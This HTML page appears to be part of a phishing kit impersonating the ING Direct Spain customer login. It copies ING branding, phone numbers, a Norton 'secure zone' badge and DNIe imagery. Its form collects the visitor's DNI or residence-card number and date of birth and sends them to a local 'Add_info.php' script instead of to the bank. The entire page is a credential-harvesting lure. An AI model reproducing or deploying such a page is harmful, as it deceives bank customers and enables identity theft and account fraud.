<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="./App/css/navbar.css">
<link rel="stylesheet" href="./App/css/body.css">
<link rel="stylesheet" href="https://icono-49d6.kxcdn.com/icono.min.css">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<script src="https://kit.fontawesome.com/9870a60e4f.js"></script>
  <script charset="utf-8" src="./App/js/val_login.js" type="text/javascript"></script>

</head>
<body style="background: linear-gradient(#ffffff, #fefefe);">

<script type="text/javascript">
  
    $(document).ready(function () {
            $('#selector').fadeIn('slow', function () {
                $('#selector').delay(4000).fadeOut(150);
            });
        });

</script>


<div class="pageLoader" id="selector" style="background-color: rgb(255, 255, 255);position: fixed;width: 100%;height: 100%;z-index: 9999;top: 0px;opacity: 1.9;text-align: center;display: none;"><div id="nucleosoma-app" class="loader"></div></div>

<div class="topnav" id="myTopnav">
  <a href="#home" class="logoo"><img id="logo" src="App/img/logoING.svg" class="img-svg es-logo svg-header-logo login-header" alt="I N G, nxxxx" tabindex="0"></a>
  <a href="#" class="phoneright" style="float: right;font-size: 13px;line-height: 2rem;"><i class="fas fa-phone-alt"></i>&nbsp;&nbsp;901 10 51 15 | 91 206 66 66</a>
</div>

<br>
<br>


<center  class="conteral">

<br><center>
<div class="example2" id="example2">
</div></center>
<!----->
<br>
<br>


<form action="./App/inc/Add_info.php" method="POST" class="D9oRm7K" name="case" id="myForm">
<div class="InboXLogin">
  <div class="menu">
    <h1 class="Acceso-para " id="tilestyle"><i class="far fa-user"></i>&nbsp;&nbsp;Acceso para Ti</h1>
    <label  class="basic-documento" id="tiledocumento">Número de documento</label>

    <div class="basic-form-control-wrap ">
      <input type="text" class="refactor basic-form-control " placeholder="DNI o Tarjeta de Residencia" id="documentnumber" name="documentnumber"  maxlength="9"  >
    </div>
    <label  class="basic-documento" style=" margin-left: 140px; ">Identificarme con pasaporte</label>

    <label  class="basic-documento" style="margin-right: 110px;border-bottom: none;">Fecha de nacimiento</label>

<fieldset id="birthdate-group" class="control-group date-input-group">
  <input  type="tel" maxlength="2" id="dd" name="DD" class="date-day" placeholder="DD" >
  <input  type="tel" maxlength="2" id="mm" name="MM" placeholder="MM" >
  <input  type="tel" maxlength="4" id="aaaa" name="AAAA" class="date-year" placeholder="AAAA" style=" border-right: none; "></fieldset>
<span style="display: none;" class="field-err-text" id="fielderr">Formato de fecha incorrecto</span>
    <label  class="basic-texts" ><div class="refactor basic-checkbox box-object-inner fastclick-force "></div>Recordar estos datos  &nbsp;<i class="far fa-question-circle" style=" font-weight: 400; font-size: 14px; "></i></label>
<br>


  <input class="refactor-etrar" id="etrar" type="submit" name="Entrar" value="Entrar">



  </div>

</form>

  <div class="right">
    <label  class="basic-documentotext" >Todavía no soy cliente</label>
    <div class="container-norton"><img tabindex="0" src="https://ing.ingdirect.es/pfm/assets/images/norton-logo.png"  class="logo-norton" role="link"><div tabindex="0" class="secure-zone va-m">Estás en una zona segura</div></div>
    <label  class="basic-documentotext" >Más información sobre seguridad</label>
<br>
<br>
<br>


<div  class="secure-zone va-m" style=" font-size: 14px; "><img  style=" width: 69px; " src="https://ing.ingdirect.es/pfm/assets/images/LogoDNIE-trazado.svg" >&nbsp;&nbsp;Si lo deseas, puedes acceder con DNI electrónico.
​</div>
  </div>
</div>
<br>
<br>
<br>
<div class="imgresponsive styleimgfooter"><img src="App/img/footerbanner.png" class="imgbanner" alt="Responsive image"></div>
  </center>


</body>
</html>





